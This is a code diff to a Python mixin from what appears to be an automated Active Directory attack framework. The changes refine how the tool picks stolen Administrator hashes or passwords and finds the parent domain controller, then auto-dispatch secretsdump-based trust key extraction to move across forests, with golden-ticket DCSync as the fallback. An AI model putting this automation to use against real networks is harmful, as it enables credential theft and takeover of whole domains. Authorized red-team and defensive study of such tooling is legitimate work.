@@ -125,35 +125,50 @@ class AnnouncementMixin:
             undominated_forests: List of foreign forests not yet dominated.
             source_agent: Agent that achieved DA.
         """
-        # Get DC IP for the domain where we have DA
+        # Deduplicate: only dispatch once per DA domain
+        # This prevents multiple dispatches when both krbtgt and Administrator hashes trigger
+        if not hasattr(self, "_trust_extraction_dispatched"):
+            self._trust_extraction_dispatched: set[str] = set()
+
         da_domain_lower = da_domain.lower()
+        if da_domain_lower in self._trust_extraction_dispatched:
+            logger.debug(f"MULTI_FOREST_MODE: Trust extraction already dispatched for {da_domain}")
+            return
+
+        # Mark as dispatched BEFORE actual dispatch (fail-safe)
+        self._trust_extraction_dispatched.add(da_domain_lower)
+
+        # Get DC IP for the domain where we have DA
         dc_ip = self.shared_state.domain_controllers.get(da_domain_lower)
         if not dc_ip:
             logger.warning(f"Cannot dispatch trust key extraction: no DC IP for {da_domain}")
             return
 
-        # Find DA credential (password or hash) for the domain
-        # Look for krbtgt hash first (proves we have full DA access)
+        # Determine if this is a child domain
+        # Trust accounts exist at forest root, so for child domains we need to escalate first
+        domain_parts = da_domain_lower.split(".")
+        is_child_domain = len(domain_parts) >= 3  # child.parent.tld
+        parent_domain = ".".join(domain_parts[1:]) if is_child_domain else None
+        cred_domain = parent_domain if is_child_domain else da_domain_lower
+        cred_domain_lower = cred_domain.lower() if cred_domain else da_domain_lower
+
+        if is_child_domain:
+            logger.info(
+                f"MULTI_FOREST_MODE: Child domain {da_domain} detected, "
+                f"need parent domain {parent_domain} credentials for trust extraction"
+            )
+
+        # Find DA credential (password or hash) for the appropriate domain
+        # For child domains, look for parent domain credentials (via golden ticket DCSync)
         da_hash = None
         da_password = None
 
-        # Check for krbtgt hash (most reliable DA indicator)
-        for h in self.shared_state.all_hashes:
-            if (
-                h.username.lower() == "krbtgt"
-                and h.domain
-                and h.domain.lower() == da_domain_lower
-                and h.hash_type.upper() == "NTLM"
-            ):
-                # We have krbtgt, look for Administrator hash to use for secretsdump
-                break
-
-        # Look for Administrator hash or password
+        # Look for Administrator hash in the appropriate domain
         for h in self.shared_state.all_hashes:
             if (
                 h.username.lower() == "administrator"
                 and h.domain
-                and h.domain.lower() == da_domain_lower
+                and h.domain.lower() == cred_domain_lower
                 and h.hash_type.upper() == "NTLM"
             ):
                 da_hash = h.hash_value
@@ -164,7 +179,7 @@ class AnnouncementMixin:
             for cred in self.shared_state.all_credentials:
                 if (
                     cred.domain
-                    and cred.domain.lower() == da_domain_lower
+                    and cred.domain.lower() == cred_domain_lower
                     and cred.password
                     and cred.username.lower() in ("administrator", da_username.lower())
                 ):
@@ -173,15 +188,69 @@ class AnnouncementMixin:
                     break
 
         if not da_hash and not da_password:
-            logger.warning(
-                f"Cannot dispatch trust key extraction: no DA credentials for {da_domain}"
-            )
+            if is_child_domain:
+                # Child domain without parent creds - defer to golden ticket flow
+                logger.warning(
+                    f"MULTI_FOREST_MODE: Child domain {da_domain} has no parent credentials "
+                    f"for {parent_domain}. Waiting for golden ticket flow to DCSync parent. "
+                    f"Trust extraction deferred."
+                )
+                # Clear dedup flag so this can be retried
+                self._trust_extraction_dispatched.discard(da_domain_lower)
+            else:
+                logger.warning(
+                    f"Cannot dispatch trust key extraction: no DA credentials for {da_domain}"
+                )
             return
+
+        # Determine the extraction domain and DC IP
+        # For child domains, use parent (forest root) since trust accounts are there
+        extraction_domain = parent_domain if is_child_domain else da_domain
+        extraction_dc_ip = dc_ip
+
+        if is_child_domain and parent_domain:
+            # Get parent DC IP
+            parent_dc_ip = self.shared_state.domain_controllers.get(parent_domain.lower())
+            if parent_dc_ip:
+                extraction_dc_ip = parent_dc_ip
+            else:
+                # Try DNS lookup for parent DC
+                try:
+                    import subprocess
+
+                    dns_cmd = ["dig", "+short", f"_ldap._tcp.dc._msdcs.{parent_domain}", "SRV"]
+                    result = subprocess.run(  # noqa: ASYNC221
+                        dns_cmd, capture_output=True, text=True, timeout=10, check=False
+                    )
+                    if result.returncode == 0 and result.stdout.strip():
+                        for line in result.stdout.strip().split("\n"):
+                            parts = line.split()
+                            if len(parts) >= 4:
+                                dc_hostname = parts[3].rstrip(".")
+                                a_cmd = ["dig", "+short", dc_hostname, "A"]
+                                a_result = subprocess.run(  # noqa: ASYNC221
+                                    a_cmd, capture_output=True, text=True, timeout=10, check=False
+                                )
+                                if a_result.returncode == 0 and a_result.stdout.strip():
+                                    extraction_dc_ip = a_result.stdout.strip().split("\n")[0]
+                                    self.shared_state.domain_controllers[parent_domain.lower()] = (
+                                        extraction_dc_ip
+                                    )
+                                    logger.info(
+                                        f"MULTI_FOREST_MODE: Resolved parent DC via DNS: "
+                                        f"{dc_hostname} -> {extraction_dc_ip}"
+                                    )
+                                    break
+                except Exception as dns_err:
+                    logger.warning(
+                        f"MULTI_FOREST_MODE: DNS resolution failed for parent: {dns_err}"
+                    )
 
         # Dispatch trust key extraction for each undominated forest
         for target_forest in undominated_forests:
             # Dedup key: source_domain:target_forest (persists across restarts via shared_state)
-            dedup_key = f"{da_domain_lower}:{target_forest.lower()}"
+            extraction_domain_lower = extraction_domain.lower() if extraction_domain else ""
+            dedup_key = f"{extraction_domain_lower}:{target_forest.lower()}"
             if dedup_key in self.shared_state.processed_trust_extractions:
                 logger.debug(f"Trust key extraction already dispatched: {dedup_key}")
                 continue
@@ -192,17 +261,17 @@ class AnnouncementMixin:
             # extract_trust_key uses secretsdump -just-dc-user FORESTNETBIOS$
             task_payload = {
                 "tool": "extract_trust_key",
-                "domain": da_domain,
+                "domain": extraction_domain,
                 "username": "Administrator" if da_hash else da_username,
                 "password": da_hash or da_password,
-                "dc_ip": dc_ip,
+                "dc_ip": extraction_dc_ip,
                 "trusted_domain": target_forest,
                 "use_hash": bool(da_hash),
             }
 
             logger.warning(
-                f"🌲 Auto-dispatching trust key extraction: {da_domain} → {target_forest} "
-                f"(DC: {dc_ip}, using {'hash' if da_hash else 'password'})"
+                f"🌲 Auto-dispatching trust key extraction: {extraction_domain} → {target_forest} "
+                f"(DC: {extraction_dc_ip}, using {'hash' if da_hash else 'password'})"
             )
 
             # Dispatch to privesc worker (has KerberosTools with extract_trust_key)
